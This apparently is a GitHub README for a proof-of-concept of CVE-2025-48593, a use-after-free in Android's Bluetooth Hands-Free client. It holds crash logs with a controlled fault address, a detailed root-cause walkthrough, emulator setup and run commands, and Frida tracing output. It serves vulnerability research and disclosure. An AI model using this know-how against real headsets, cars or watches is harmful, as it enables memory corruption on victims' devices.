Proof-of-concept for [CVE-2025-48593](https://source.android.com/docs/security/bulletin/2025-11-01) based on examining the [patch](https://android.googlesource.com/platform/packages/modules/Bluetooth/+/b8153e05d0b9224feb0ace8c24eeeadc80e4dffc).

You shouldn't worry about this. As far as I can tell, phones are **NOT** vulnerable to CVE-2025-48593. The issue only affects Android devices that support acting as Bluetooth headphones / speakers, such as some smartwatches, smart glasses, and cars. In addition, an attacker has to get a victim to [pair](https://cs.android.com/android/platform/superproject/main/+/main:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_rfc.cc;l=192;drc=86d90eee9dd37eccdd19449b9d72b883df060f9b) to the attacker before they can access the headset service. As long as you don't accept the pairing request on your smartwatch/glasses/car, you should be fine.

This proof-of-concept isn't useful for anything: it only crashes the Android Automotive emulator with a `fault addr 0x4141414141414141`.

You can read [my writeup](https://worthdoingbadly.com/bluetooth/) on my blog.

## Results

When running against the Android Automotive 14 emulator in Android Studio, [I get](https://youtu.be/tpJv3p89FHA):

```
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/sdk_gcar_arm64/emulator_car64_arm64:14/UAA1.250512.001/13479943:userdebug/dev-keys'
Revision: '0'
ABI: 'arm64'
Timestamp: 2025-12-01 17:28:17.644347763-0500
Process uptime: 0s
Cmdline: com.google.android.bluetooth
pid: 6386, tid: 6424, name: bt_main_thread  >>> com.google.android.bluetooth <<<
uid: 1001002
tagged_addr_ctrl: 0000000000000001 (PR_TAGGED_ADDR_ENABLE)
pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x4141414141414141
    x0  4141414141414141  x1  b4000073106a14a0  x2  0000000000000103  x3  414141414141413e
    x4  b4000073106a15a3  x5  4141414141414241  x6  0000000000000100  x7  000000000000010f
    x8  0000000000000000  x9  4141414141414141  x10 0000000000000002  x11 00000070c20c8558
    x12 0000000000000018  x13 00000000ffffffbf  x14 0000000000000003  x15 0000000000000001
    x16 00000070c253f470  x17 00000073f6ee3a40  x18 00000070bb2c6060  x19 00000070c258c0c0
    x20 b4000073106a14a3  x21 0000000000000100  x22 00000070bc384000  x23 000000004141413e
    x24 00000070bc384000  x25 00000070bc384000  x26 00000070bc383ff8  x27 00000000000fc000
    x28 00000000000fe000  x29 00000070bc383470
    lr  00000070c20c3d58  sp  00000070bc383460  pc  00000073f6ee3b38  pst 00000000a0001000

15 total frames
backtrace:
      #00 pc 000000000005fb38  /apex/com.android.runtime/lib64/bionic/libc.so (__memcpy_aarch64_simd+248) (BuildId: 8bd98d931a32d13659267d7d53286e73)
      #01 pc 00000000006aad54  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdp_copy_raw_data(tCONN_CB*, bool)+344) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #02 pc 00000000006aa0c0  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_service_search_attr_rsp(tCONN_CB*, unsigned char*, unsigned char*)+624) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #03 pc 00000000006a9760  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdp_data_ind(unsigned short, BT_HDR*)+212) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #04 pc 00000000007387b4  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_execute(t_l2c_ccb*, tL2CEVT, void*)+9412) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #05 pc 00000000009d6ce8  /apex/com.android.btservices/lib64/libbluetooth_jni.so (base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask*)+196) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #06 pc 00000000009d6260  /apex/com.android.btservices/lib64/libbluetooth_jni.so (base::MessageLoop::RunTask(base::PendingTask*)+352) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #07 pc 00000000009d6574  /apex/com.android.btservices/lib64/libbluetooth_jni.so (base::MessageLoop::DoWork()+452) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #08 pc 00000000009d8964  /apex/com.android.btservices/lib64/libbluetooth_jni.so (base::MessagePumpDefault::Run(base::MessagePump::Delegate*)+100) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #09 pc 00000000009e4a34  /apex/com.android.btservices/lib64/libbluetooth_jni.so (base::RunLoop::Run()+64) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #10 pc 000000000069aaa4  /apex/com.android.btservices/lib64/libbluetooth_jni.so (bluetooth::common::MessageLoopThread::Run(std::__1::promise<void>)+336) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #11 pc 000000000069a584  /apex/com.android.btservices/lib64/libbluetooth_jni.so (bluetooth::common::MessageLoopThread::RunThread(bluetooth::common::MessageLoopThread*, std::__1::promise<void>)+48) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #12 pc 000000000069b090  /apex/com.android.btservices/lib64/libbluetooth_jni.so (void* std::__1::__thread_proxy<std::__1::tuple<std::__1::unique_ptr<std::__1::__thread_struct, std::__1::default_delete<std::__1::__thread_struct> >, void (*)(bluetooth::common::MessageLoopThread*, std::__1::promise<void>), bluetooth::common::MessageLoopThread*, std::__1::promise<void> > >(void*)+84) (BuildId: fe3c1bf88cf688f5197df2b2f326f723)
      #13 pc 00000000000cb6a8  /apex/com.android.runtime/lib64/bionic/libc.so (__pthread_start(void*)+208) (BuildId: 8bd98d931a32d13659267d7d53286e73)
      #14 pc 000000000006821c  /apex/com.android.runtime/lib64/bionic/libc.so (__start_thread+64) (BuildId: 8bd98d931a32d13659267d7d53286e73)
```

## More results

These are from my [original proof-of-concept](https://github.com/zhuowei/blueshrimp/tree/first-poc) before I figured out how to reallocate the buffer:

After forcing an Android 15 emulator to act as a Bluetooth speaker, running this code gives a null deference:

```
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/sdk_gphone64_arm64/emu64a:15/AE3A.240806.043/12960925:userdebug/dev-keys'
Revision: '0'
ABI: 'arm64'
Timestamp: 2025-11-13 22:03:35.264596895-0500
Process uptime: 0s
Cmdline: com.google.android.bluetooth
pid: 5549, tid: 5589, name: bt_main_thread  >>> com.google.android.bluetooth <<<
uid: 1002
tagged_addr_ctrl: 0000000000000001 (PR_TAGGED_ADDR_ENABLE)
pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
signal 11 (SIGSEGV), code 1 (SEGV_MAPERR), fault addr 0x2a20010000000000
    x0  00000074d49ccf5a  x1  b4000076cb2f4f80  x2  0000000000000035  x3  000000752fd5403c
    x4  b4000075cb32c6f9  x5  b40000764b322462  x6  0000000000000035  x7  b4000076db2ef159
    x8  0007ac63ecbcb3da  x9  0000000000000002  x10 b40000764b322460  x11 00000074d476c3a4
    x12 000000000000000c  x13 000000007fffffff  x14 0000000000000001  x15 000006a9e9459ce0
    x16 00000074d4974360  x17 00000077fcd25700  x18 00000074d0aa8060  x19 00000074d49ccf5a
    x20 00000074d3e9d98b  x21 2a20010000000000  x22 00000074d3e28d23  x23 00000074d414ae8c
    x24 000000752fd54a80  x25 0000000000003002  x26 b4000076cb2f4f80  x27 00000074d3e9d92c
    x28 000000752fd541f0  x29 000000752fd53fd0
    lr  00000074d476702c  sp  000000752fd53940  pc  00000074d476ab88  pst 0000000060001000

14 total frames
backtrace:
      #00 pc 0000000000969b88  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdpu_log_attribute_metrics(RawAddress const&, tSDP_DISCOVERY_DB*)+284) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #01 pc 0000000000966028  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_service_search_attr_rsp(tCONN_CB*, unsigned char*, unsigned char*)+1104) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #02 pc 0000000000965884  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdp_data_ind(unsigned short, BT_HDR*)+296) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #03 pc 00000000009f45cc  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_execute(t_l2c_ccb*, tL2CEVT, void*)+12968) (BuildId: 6f08819253185bc44c9fec07ed93c598)
```

With [malloc_debug](https://android.googlesource.com/platform/bionic/+/master/libc/malloc_debug/README.md) set to fill on free, I get:

```
*** *** *** *** *** *** *** *** *** *** *** *** *** *** *** ***
Build fingerprint: 'google/sdk_gphone64_arm64/emu64a:15/AE3A.240806.043/12960925:userdebug/dev-keys'
Revision: '0'
ABI: 'arm64'
Timestamp: 2025-11-13 22:44:39.509419570-0500
Process uptime: 0s
Cmdline: com.google.android.bluetooth
pid: 7391, tid: 7422, name: bt_main_thread  >>> com.google.android.bluetooth <<<
uid: 1002
tagged_addr_ctrl: 0000000000000001 (PR_TAGGED_ADDR_ENABLE)
pac_enabled_keys: 000000000000000f (PR_PAC_APIAKEY, PR_PAC_APIBKEY, PR_PAC_APDAKEY, PR_PAC_APDBKEY)
signal 11 (SIGSEGV), code 2 (SEGV_ACCERR), fault addr 0xb4000076954f3000
    x0  b4000076954f3002  x1  b4000076954e48a8  x2  000000000000ebeb  x3  000000764031dd58
    x4  0000000000000004  x5  68746f6f7465756c  x6  68746f6f7465756c  x7  b4000076f54d5ad9
    x8  b4000076954f2fff  x9  000000000000d78b  x10 0000000000000009  x11 0000000000000009
    x12 000000000000d78b  x13 0000000000000008  x14 0000000000000004  x15 000006b7ae6ad944
    x16 0000000000000001  x17 000000794c270af0  x18 0000007578ca8070  x19 000000757e7cff58
    x20 0000000000000000  x21 0000000000000000  x22 b4000076954c9950  x23 0000000000000043
    x24 000000764031ea80  x25 b4000076954c9965  x26 b4000076954c9968  x27 000000764031ea80
    x28 000000764031df70  x29 000000764031ddb0
    lr  000000757e569d30  sp  000000764031dd50  pc  000000757e56ec08  pst 0000000080001000

17 total frames
backtrace:
      #00 pc 000000000096ac08  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdpu_build_attrib_seq(unsigned char*, unsigned short*, unsigned short)+112) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #01 pc 0000000000965d2c  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_service_search_attr_rsp(tCONN_CB*, unsigned char*, unsigned char*)+340) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #02 pc 0000000000965494  /apex/com.android.btservices/lib64/libbluetooth_jni.so (sdp_config_cfm(unsigned short, unsigned short, tL2CAP_CFG_INFO*)+248) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #03 pc 00000000009f7364  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_indicate_connection_open(t_l2c_ccb*)+220) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #04 pc 00000000009f346c  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_csm_execute(t_l2c_ccb*, tL2CEVT, void*)+8520) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #05 pc 00000000009fe380  /apex/com.android.btservices/lib64/libbluetooth_jni.so (process_l2cap_cmd(t_l2c_linkcb*, unsigned char*, unsigned short)+376) (BuildId: 6f08819253185bc44c9fec07ed93c598)
      #06 pc 00000000009fdf64  /apex/com.android.btservices/lib64/libbluetooth_jni.so (l2c_rcv_acl_data(BT_HDR*)+624) (BuildId: 6f08819253185bc44c9fec07ed93c598)
```

I have not tested this on a physical device.

## My understanding of what's happening

Bluetooth headphones use the [Handsfree Profile](<https://en.wikipedia.org/wiki/List_of_Bluetooth_profiles#Hands-Free_Profile_(HFP)>).

Handsfree Profile is special: unlike most Bluetooth services, where one side acts as a client and one side acts as a server, both the headset and the connecting device (e.g. a phone) need to run a Bluetooth server.

After the phone connects to the headset's Handsfree service (0x111e), the headset then connects back to the phone's Handsfree Audio Gateway service (0x111f).

When a phone opens an RFCOMM connection to the headset's Handsfree service, in the headset's hf_client code:

- [bta_hf_client_allocate_handle](https://cs.android.com/android/platform/superproject/main/+/main:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_main.cc;l=556;drc=875c5971d0201d3c67cc166ad9ab8b2b4a7cab7f) allocates a `tBTA_HF_CLIENT_CB` handle from the pool
- [bta_hf_client_do_disc](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_sdp.cc;l=382;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) allocates a `tSDP_DISCOVERY_DB`, stores it in `client_cb->p_disc_db`, and starts SDP discovery
- [SDP_ServiceSearchAttributeRequest2](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/stack/sdp/sdp_api.cc;l=205;drc=138659ad3ff2961010b9cacd36fceb36ba73dcce) stores the `tSDP_DISCOVERY_DB` into a `tCONN_CB`'s `p_ccb->p_db`, then connects to the phone's SDP service
- now the `tSDP_DISCOVERY_DB` is stored both in the hf_client's `client_cb->p_disc_db` handle and in the SDP layer's `p_ccb->p_db`

When the phone's RFCOMM connection is closed:

- [bta_hf_client_mgmt_cback](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_rfc.cc;l=143;drc=86d90eee9dd37eccdd19449b9d72b883df060f9b) emits a `BTA_HF_CLIENT_RFC_CLOSE_EVT`
- [the bta_hf_client_st_opening state table](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_main.cc;l=157;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) calls the handler for [bta_hf_client_rfc_close](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_act.cc;l=278;drc=031a4c3b0a00602b7bbd08ffd8b4d02fdccb5989) and resets the state machine to `BTA_HF_CLIENT_INIT_ST`
- [bta_hf_client_sm_execute](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_main.cc;l=728;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) sees the state transition and deallocates the `tBTA_HF_CLIENT_CB` handle back to the pool
- However, before the patch, the SDP connection is not cancelled, and is still waiting for a response
- At this time, there's a `tBTA_HF_CLIENT_CB` returned to the unallocated pool, with `client_cb->p_disc_db` still set and a still active SDP discovery

When the phone answers the SDP discovery with an error:

- [bta_hf_client_sdp_cback](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_sdp.cc;l=85;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) emits a `BTA_HF_CLIENT_DISC_INT_RES_EVT`
- [the bta_hf_client_st_opening state table](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_main.cc;l=164;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) calls the handler for [bta_hf_client_disc_int_res](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_act.cc;l=319;drc=031a4c3b0a00602b7bbd08ffd8b4d02fdccb5989)
- [bta_hf_client_free_db](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_sdp.cc;l=413;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) frees `client_cb->p_disc_db`
- so now the `tSDP_DISCOVERY_DB` is freed, `client_cb->p_disc_db` is null, and the SDP layer no longer has a `p_ccb->p_db` to the discovery DB.

However, if the phone opens RFCOMM again before the first SDP discovery returns:

- we reallocate a handle (probably the same handle that was deallocated to the pool previously) and call discovery again.
- the `client_cb->p_disc_db` now points to a new `tSDP_DISCOVERY_DB`, and the SDP layer holds two `tSDP_DISCOVERY_DB`s: one `p_ccb->p_db` holds the old DB from the first connection and one `p_ccb->p_db` holds the new DB from the second connection

Now, the phone answers the first SDP discovery with an error:

- the SDP layer closes the `p_ccb` from the first connection
- [bta_hf_client_free_db](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/bta/hf_client/bta_hf_client_sdp.cc;l=413;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) frees `client_cb->p_disc_db`, which is the _second_ connection's DB
- now the hf_client's `client_cb->p_disc_db` is freed and set to null, and the SDP's `p_ccb` for the first connection is gone
- but the `p_ccb` for the second connection is still active, so `p_ccb->p_db` for the second SDP discovery request points to a freed `tSDP_DISCOVERY_DB`

Finally, the phone answers the second SDP discovery with an actual response:

- the SDP layer processes the incoming data in [sdp_data_ind](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/stack/sdp/sdp_main.cc;l=234;drc=0e45ce1dc53e611da84344e7c5a11108ad7dba46) and dispatches to sdp_disc_server_rsp
- [process_service_search_attr_rsp](https://cs.android.com/android/platform/superproject/+/android-latest-release:packages/modules/Bluetooth/system/stack/sdp/sdp_discovery.cc;l=683;drc=769caf391c6055c6f9db945b71d96b2f01c8799c) starts reading from `p_ccb->p_db`
- since `p_db` was already freed by `bta_hf_client_free_db` from the first SDP discovery's error response, the second SDP response causes use-after-free.

What I don't understand:

- Bionic supports [malloc_debug](https://android.googlesource.com/platform/bionic/+/master/libc/malloc_debug/README.md): setting `"LIBC_DEBUG_MALLOC_OPTIONS=fill\ verbose"` fills memory with `0xef` on free. Why don't I see `0xef`s in the crash log?

## Running

Create an Android Studio emulator with Android Automotive 14, API 34-ext9, "Android Automotive with Google APIs arm64-v8a System Image", version 5 - this has Headset Client enabled out-of-the-box.

Alternatively, to make non-Automotive Android Emulator emulate a Bluetooth headphone:

Start a local Android Emulator for Android 15 in Android Studio. (I'm using Android Emulator for Android 15, "Google APIs ARM 64 v8a System Image", version 9)

```
adb root
adb shell
setprop bluetooth.profile.hfp.hf.enabled true
# optionally:
# setprop wrap.com.google.android.bluetooth "LIBC_DEBUG_MALLOC_OPTIONS=fill\ verbose"
am force-stop com.google.android.bluetooth
```

Then

```
python3 -m venv env
. env/bin/activate
pip install bumble
bumble-pair --mode classic device.json android-netsim DA:4C:10:DE:17:00
# accept pairing in terminal and in emulator, then Ctrl+C after pairing completes
python3 blueshrimp.py
# you need to run it twice for some reason...
python3 blueshrimp.py
```

If the emulator is vulnerable (e.g. Android 15 API 35 "Google APIs ARM 64 v8a System Image" revision 9), you'll get:

```
(env) zhuowei-laptop:blueshrimp zhuowei$ python3 blueshrimp.py
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
I0000 00:00:1763097284.153459 24000650 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
I0000 00:00:1763097284.158812 24000650 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
<bound method Server.on_sdp_service_search_attribute_request of <bumble.sdp.Server object at 0x1025ae3c0>>
open dlc!!!!!!!
got SDP, doing NOTHING SDP_SERVICE_SEARCH_ATTRIBUTE_REQUEST [TID=0]:
  service_search_pattern:       SEQUENCE([UUID(UUID-16:111F (HandsfreeAudioGateway))])
  maximum_attribute_byte_count: 1008
  attribute_id_list:            SEQUENCE([UNSIGNED_INTEGER(1#2),UNSIGNED_INTEGER(9#2),UNSIGNED_INTEGER(785#2)])
  continuation_state:           00
got SDP, doing NOTHING SDP_SERVICE_SEARCH_ATTRIBUTE_REQUEST [TID=0]:
  service_search_pattern:       SEQUENCE([UUID(00001106-0000-1000-3500-1C0000110600)])
  maximum_attribute_byte_count: 1008
  attribute_id_list:            SEQUENCE([UNSIGNED_INTEGER(1#2),UNSIGNED_INTEGER(9#2),UNSIGNED_INTEGER(785#2)])
  continuation_state:           00
(env) zhuowei-laptop:blueshrimp zhuowei$
```

And you'll see a crash in logcat.

Or, with the `LIBC_DEBUG_MALLOC_OPTIONS`:

```
(env) zhuowei-laptop:blueshrimp zhuowei$ python3 blueshrimp.py
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
I0000 00:00:1763097125.539691 23998204 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
I0000 00:00:1763097125.546204 23998204 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
<bound method Server.on_sdp_service_search_attribute_request of <bumble.sdp.Server object at 0x104bc23c0>>
open dlc!!!!!!!
got SDP, doing NOTHING SDP_SERVICE_SEARCH_ATTRIBUTE_REQUEST [TID=0]:
  service_search_pattern:       SEQUENCE([UUID(UUID-16:111F (HandsfreeAudioGateway))])
  maximum_attribute_byte_count: 1008
  attribute_id_list:            SEQUENCE([UNSIGNED_INTEGER(1#2),UNSIGNED_INTEGER(9#2),UNSIGNED_INTEGER(785#2)])
  continuation_state:           00
Traceback (most recent call last):
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/blueshrimp.py", line 91, in <module>
    asyncio.run(main())
    ~~~~~~~~~~~^^^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/blueshrimp.py", line 87, in main
    requests[1])
    ~~~~~~~~^^^
IndexError: list index out of range
(env) zhuowei-laptop:blueshrimp zhuowei$ python3 blueshrimp.py
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
I0000 00:00:1763097146.578122 23998494 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
I0000 00:00:1763097146.584279 23998494 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
<bound method Server.on_sdp_service_search_attribute_request of <bumble.sdp.Server object at 0x104f4e3c0>>
open dlc!!!!!!!
got SDP, doing NOTHING SDP_SERVICE_SEARCH_ATTRIBUTE_REQUEST [TID=0]:
  service_search_pattern:       SEQUENCE([UUID(UUID-16:111F (HandsfreeAudioGateway))])
  maximum_attribute_byte_count: 1008
  attribute_id_list:            SEQUENCE([UNSIGNED_INTEGER(1#2),UNSIGNED_INTEGER(9#2),UNSIGNED_INTEGER(785#2)])
  continuation_state:           00
Traceback (most recent call last):
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/blueshrimp.py", line 91, in <module>
    asyncio.run(main())
    ~~~~~~~~~~~^^^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/blueshrimp.py", line 76, in main
    await channel.disconnect()
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/env/lib/python3.13/site-packages/bumble/rfcomm.py", line 645, in disconnect
    await self.disconnection_result
asyncio.exceptions.CancelledError
```

If the emulator is not vulnerable (e.g. Android 16 API 36.1 "Google APIs ARM 64 v8a System Image" revision 3)

```
(env) zhuowei-laptop:blueshrimp zhuowei$ python3 blueshrimp.py
WARNING: All log messages before absl::InitializeLog() is called are written to STDERR
I0000 00:00:1763092971.476083 23945806 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
I0000 00:00:1763092971.486513 23945806 fork_posix.cc:71] Other threads are currently calling into gRPC, skipping fork() handlers
<bound method Server.on_sdp_service_search_attribute_request of <bumble.sdp.Server object at 0x10697e3c0>>
open dlc!!!!!!!
got SDP, doing NOTHING SDP_SERVICE_SEARCH_ATTRIBUTE_REQUEST [TID=0]:
  service_search_pattern:       SEQUENCE([UUID(UUID-16:111F (HandsfreeAudioGateway))])
  maximum_attribute_byte_count: 1008
  attribute_id_list:            SEQUENCE([UNSIGNED_INTEGER(1#2),UNSIGNED_INTEGER(9#2),UNSIGNED_INTEGER(785#2)])
  continuation_state:           00
got SDP, doing NOTHING SDP_SERVICE_SEARCH_ATTRIBUTE_REQUEST [TID=0]:
  service_search_pattern:       SEQUENCE([UUID(UUID-16:111F (HandsfreeAudioGateway))])
  maximum_attribute_byte_count: 1008
  attribute_id_list:            SEQUENCE([UNSIGNED_INTEGER(1#2),UNSIGNED_INTEGER(9#2),UNSIGNED_INTEGER(785#2)])
  continuation_state:           00
Traceback (most recent call last):
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/blueshrimp.py", line 91, in <module>
    asyncio.run(main())
    ~~~~~~~~~~~^^^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/opt/homebrew/Cellar/python@3.13/3.13.4/Frameworks/Python.framework/Versions/3.13/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/blueshrimp.py", line 86, in main
    device.sdp_server.orig_on_sdp_service_search_attribute_request(
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
        requests[1])
        ^^^^^^^^^^^^
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/env/lib/python3.13/site-packages/bumble/sdp.py", line 1330, in on_sdp_service_search_attribute_request
    self.send_response(
    ~~~~~~~~~~~~~~~~~~^
        SDP_ServiceSearchAttributeResponse(
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    ...<4 lines>...
        )
        ^
    )
    ^
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/env/lib/python3.13/site-packages/bumble/sdp.py", line 1063, in send_response
    self.channel.send_pdu(response)
    ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^
  File "/Users/zhuowei/Documents/winprogress/oculus/stella/blueshrimp/env/lib/python3.13/site-packages/bumble/l2cap.py", line 772, in send_pdu
    raise InvalidStateError('channel not open')
bumble.core.InvalidStateError: channel not open
(env) zhuowei-laptop:blueshrimp zhuowei$
```

## Notes on physical Bluetooth USB adapters

I'm using a TP-Link UB400 v2.6 (RTL8761BU) with Bumble on macOS.

I originally tried the ASUS USB-BT500 v2 adapter (RTL8761CU) and found it doesn't work with Bumble on macOS. When Bumble tries to establish an L2CAP connection, the target device receives the connection request packet and sends a response, but the USB-BT500 v2 doesn't receive the response at all, and the connection fails.

(The ASUS USB-BT500 v2 works fine on Linux with Bumble.)

## Tools

This repo also contains a `dumpbt.js` Frida script for tracing the Bluetooth process in the emulator:

```
sym_bta_hf_client_allocate_handle called
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0x0
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0x0
bta_hf_client_do_disc called
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0xb4000076cb2f73a0
sdpu_find_ccb_by_cid called 0x48
sdpu_find_ccb_by_cid result 0x74d95d2ea8 p_db 0xb4000076cb2f73a0
sdpu_find_ccb_by_cid called 0x48
sdpu_find_ccb_by_cid result 0x74d95d2ea8 p_db 0xb4000076cb2f73a0
sdpu_find_ccb_by_cid called 0x48
sdpu_find_ccb_by_cid result 0x74d95d2ea8 p_db 0xb4000076cb2f73a0
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0xb4000076cb2f73a0
sym_bta_hf_client_allocate_handle called
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0x0
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0x0
bta_hf_client_do_disc called
bta_hf_client_find_cb_by_handle called 0x1
bta_hf_client_find_cb_by_handle result 0x74d95a4a30 p_disc_db 0xb4000076cb2f6190
sdpu_find_ccb_by_cid called 0x48
sdpu_find_ccb_by_cid result 0x74d95d2ea8 p_db 0xb4000076cb2f73a0
sdpu_find_ccb_by_cid called 0x48
sdpu_find_ccb_by_cid result 0x74d95d2ea8 p_db 0xb4000076cb2f73a0
bta_hf_client_find_cb_by_handle called 0x1
